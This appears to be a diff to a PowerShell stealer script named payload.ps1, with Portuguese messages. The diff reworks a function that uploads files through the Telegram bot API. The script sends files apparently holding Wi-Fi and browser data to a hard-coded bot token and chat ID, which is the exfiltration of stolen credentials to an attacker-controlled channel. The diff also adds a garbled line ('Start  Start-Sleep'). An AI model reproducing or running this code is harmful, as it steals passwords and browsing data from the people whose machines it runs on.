@@ -71,23 +71,30 @@ function Send-TelegramFile {
         return
     }
     $uri = "https://api.telegram.org/bot$Token/sendDocument"
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $contentType = "multipart/form-data; boundary=$boundary"
+    $fileName = [System.IO.Path]::GetFileName($FilePath)
+    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+    # Usar Base64 para evitar problemas de codificação
+    $fileContent = [System.Convert]::ToBase64String($fileBytes)
+    $bodyLines = @(
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"chat_id`"",
+        "",
+        $ChatId,
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
+        "Content-Type: application/octet-stream",
+        "",
+        $fileContent,
+        "--$boundary--"
+    ) -join "`r`n"
     try {
-        $httpClient = New-Object System.Net.Http.HttpClient
-        $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
-        $multipartContent.Add((New-Object System.Net.Http.StringContent($ChatId)), "chat_id")
-        $fileStream = [System.IO.File]::OpenRead($FilePath)
-        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-        $fileContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
-        $fileName = [System.IO.Path]::GetFileName($FilePath)
-        $multipartContent.Add($fileContent, "document", $fileName)
-        $response = $httpClient.PostAsync($uri, $multipartContent).Result
-        $response.EnsureSuccessStatusCode()
-        $responseContent = $response.Content.ReadAsStringAsync().Result
-        Write-Output "Arquivo $fileName enviado com sucesso. Resposta: $responseContent"
-        $fileStream.Close()
-        $httpClient.Dispose()
+        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType $contentType -Body $bodyLines -ErrorAction Stop
+        Write-Output "Arquivo $fileName enviado com sucesso. Resposta: $($response | ConvertTo-Json -Depth 3)"
     } catch {
         Write-Output "Erro ao enviar $fileName : $_"
+        Write-Output "Detalhes do erro: $($_.Exception.Response.StatusCode) - $($_.Exception.Message)"
     }
 }
 
@@ -105,7 +112,7 @@ $token = "7875549832:AAGBdj5P0_WZwA2CTzwsl5BxmMsEBK-A-zw"
 $chatid = "5400490425"
 Write-Output "Enviando arquivos para o Telegram (Token: $token, ChatID: $chatid)"
 Send-TelegramFile -Token $token -ChatId $chatid -FilePath $wifiFile
-Start-Sleep -Seconds 2  # Pequena pausa para evitar limites de taxa
+Start  Start-Sleep -Seconds 2
 Send-TelegramFile -Token $token -ChatId $chatid -FilePath $browserFile
 
 Write-Output "=== Finalizando payload.ps1 em $(Get-Date) ==="
